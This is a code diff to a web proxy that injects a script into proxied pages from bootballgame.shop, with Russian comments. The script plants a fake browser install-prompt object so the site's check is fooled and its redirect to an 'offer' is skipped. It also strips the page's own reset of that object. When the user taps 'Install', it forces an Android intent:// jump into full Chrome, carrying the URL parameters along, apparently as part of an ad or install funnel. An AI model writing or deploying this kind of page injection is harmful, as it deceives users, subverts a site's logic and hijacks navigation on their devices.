@@ -80,6 +80,52 @@ function rewriteBody(body, contentType, proxyHost, proxyOrigin) {
       /navigator\.serviceWorker\.register\('\/(?!go\/)/g,
       `navigator.serviceWorker.register('${PROXY_PATH}/`
     );
+
+    // ─── Инжекция фейкового deferredPrompt ──────────────────────────────
+    // bootballgame.shop JS проверяет window.deferredPrompt != null через 1 сек.
+    // Если null → редирект на оффер. Подделываем чтобы показать install page.
+    // При вызове prompt() → открываем bootballgame.shop в Chrome через intent.
+    const fakePromptScript = `<script>
+(function() {
+  // Получаем параметры из текущего URL для передачи на bootballgame.shop
+  var params = window.location.search || '';
+  var targetUrl = 'https://bootballgame.shop/' + params;
+
+  // Фейковый beforeinstallprompt event
+  var fakeEvent = {
+    preventDefault: function() {},
+    prompt: function() {
+      // При нажатии "Установить" → открываем bootballgame.shop в Chrome
+      // intent:// заставляет Android открыть URL в полном Chrome, не CCT
+      var intentUrl = 'intent://' + targetUrl.replace('https://', '') +
+        '#Intent;scheme=https;package=com.android.chrome;end';
+      window.location.href = intentUrl;
+      return Promise.resolve({ outcome: 'accepted', platform: '' });
+    },
+    userChoice: Promise.resolve({ outcome: 'accepted', platform: '' })
+  };
+
+  window.deferredPrompt = fakeEvent;
+
+  // Также перехватываем событие beforeinstallprompt если оно сработает реально
+  var origDeferredPrompt = null;
+  window.addEventListener('beforeinstallprompt', function(e) {
+    e.preventDefault();
+    origDeferredPrompt = e;
+    // Подменяем фейковый на реальный!
+    window.deferredPrompt = e;
+  });
+})();
+</script>`;
+
+    // Вставляем скрипт сразу после <head>
+    body = body.replace(/<head([^>]*)>/i, `<head$1>${fakePromptScript}`);
+
+    // Убираем оригинальный window.deferredPrompt = null (он обнулит наш фейковый)
+    body = body.replace(
+      /window\.deferredPrompt\s*=\s*null/g,
+      'window.deferredPrompt = window.deferredPrompt || null'
+    );
   }
 
   // JS/CSS файлы: перезаписываем абсолютные пути к ресурсам
